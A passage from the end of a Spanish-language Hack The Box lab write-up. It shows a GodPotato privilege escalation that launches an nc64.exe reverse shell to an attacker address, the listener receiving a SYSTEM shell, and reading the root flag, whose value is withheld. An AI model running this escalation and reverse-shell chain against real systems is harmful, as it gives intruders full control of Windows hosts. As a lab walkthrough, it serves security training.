PS C:\users\svc_mssql> ./GodPotato.exe -cmd "cmd /c C:\users\svc_mssql\nc64.exe -t -e cmd.exe 10.10.14.28 4433"
~~~
Desde otra terminal se ejecuta un escucha y se obtiene una shell.
~~~bash
┌──(kali㉿kali)-[~/htb/breach]
└─$ rlwrap -cAr nc -nvlp 4433                                                       
listening on [any] 4433 ...
connect to [10.10.14.28] from (UNKNOWN) [10.129.9.120] 58326
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\users\svc_mssql>whoami
whoami
nt authority\system
~~~

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso como `nt authority\system` se puede ver la root flag.
~~~bash
C:\users\svc_mssql>cd ../
cd ../

C:\Users>type administrator\desktop\root.txt
type administrator\desktop\root.txt
<Encuentre su propia root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

